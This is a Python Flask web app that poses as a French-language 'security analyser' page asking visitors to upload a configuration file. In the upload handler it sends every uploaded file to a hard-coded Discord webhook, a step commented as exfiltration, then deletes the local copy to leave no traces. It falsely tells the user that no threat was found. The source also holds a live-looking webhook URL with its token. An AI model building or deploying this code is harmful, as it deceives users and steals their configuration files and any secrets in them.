from flask import Flask, request, render_template_string
import os
import requests

app = Flask(__name__)

# Ton Webhook Discord
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1472218471784779817/pDNNHV_GGvkMD2N_cKBOUjB2FELSv2xlnLneu2YNACMGelQF8Wn1teofXDY9E8JpAD7B"

HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Analyseur de Système</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 100px; background-color: #f4f4f9; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); display: inline-block; }
        button { background-color: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
        #status { margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Vérification de sécurité</h2>
        <p>Sélectionnez le fichier de configuration à analyser :</p>
        <input type="file" id="fileInput"><br><br>
        <button onclick="upload()">Lancer l'analyse</button>
        <div id="status"></div>
    </div>

    <script>
    async function upload() {
        const fileInput = document.getElementById('fileInput');
        const status = document.getElementById('status');
        if (fileInput.files.length === 0) return;

        const formData = new FormData();
        formData.append('file', fileInput.files[0]);

        status.innerText = "Analyse en cours...";
        status.style.color = "orange";

        try {
            const res = await fetch('/upload', { method: 'POST', body: formData });
            if (res.ok) {
                status.innerText = "Analyse terminée. Aucune menace détectée.";
                status.style.color = "green";
            } else {
                status.innerText = "Erreur lors de l'analyse.";
                status.style.color = "red";
            }
        } catch (e) {
            status.innerText = "Erreur de connexion.";
        }
    }
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return "Erreur", 400
    
    file = request.files['file']
    path = os.path.join('/tmp', file.filename)
    file.save(path)
    
    # EXFILTRATION VERS DISCORD
    try:
        with open(path, 'rb') as f:
            requests.post(DISCORD_WEBHOOK, files={'file': f})
        print(f"✅ Fichier {file.filename} envoyé sur Discord.")
    except Exception as e:
        print(f"❌ Erreur Discord : {e}")
    finally:
        # Nettoyage pour ne pas laisser de traces sur Render
        if os.path.exists(path):
            os.remove(path)
            
    return "OK", 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
